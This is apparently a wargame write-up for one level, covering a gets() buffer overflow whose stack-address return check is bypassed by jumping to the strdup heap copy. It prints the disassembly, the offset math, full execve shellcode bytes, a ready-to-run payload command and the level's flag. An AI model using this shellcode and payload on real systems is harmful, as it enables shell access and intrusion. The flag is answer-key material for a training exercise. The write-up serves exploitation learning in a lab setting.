# Way to level3

## Core
`p()` allows a BOF via `gets()`, but there is **no reusable** `run`/`system` → inject
shellcode. Before `ret`, the return address is checked (`and $0xb0000000; cmp`), rejecting
stack (0xb…) addresses → `strdup()` copies the input **onto the heap**, so jump to that
heap address to bypass the check.

## Decisive disass (full: `disas p`)
```
<+25>:  call gets@plt           ; buf = ebp-0x4c, BOF
<+36~>: and  $0xb0000000,%eax    ; check return-address high nibble
<+44>:  cmp  $0xb0000000,%eax
<+49>:  jne  p+83               ; 0xb (stack) -> rejected via printf+_exit
<+100>: call strdup@plt          ; pass path: copy input to heap, then ret
```

## Exploit
- offset 80 (derivation): buf at `ebp-0x4c` (76) + saved ebp 4B = 80. Unlike level1, `p()`
  has no alignment `and` (that lives in main), so padding is 0 → exactly 80.
  (source: `lea -0x4c(%ebp)` @ p+19)
- Value: heap address `0x0804a008` = strdup return (source: `ltrace ./level2 | grep strdup`).
  Little-endian `\x08\xa0\x04\x08`.
- payload: `shellcode(25B) + 'A'*(80-25=55) + '\x08\xa0\x04\x08'`.
  Shellcode is `execve("/bin//sh")`. Leaving `edx` (envp) uninitialized gives `EFAULT(-14)`,
  so `\x89\xc2` (mov edx,eax=0) is added → 23B→25B. (source: the initial 23B failed with EFAULT)
- Delivery: `/bin/sh` is interactive → cat - trick (same as level1).
```bash
python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "A"*55 + "\x08\xa0\x04\x08"' > /tmp/exploit
cat /tmp/exploit - | ./level2
```

## Diff from previous
level1 had **reusable code (`run`)**, so ret2func was enough. level2 has no such code and
even a stack-address check, blocking ret2stack/ret2libc → put **shellcode on the heap (via
strdup)** and jump there. offset also 76→80 (presence/absence of alignment padding).

## Result
`492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
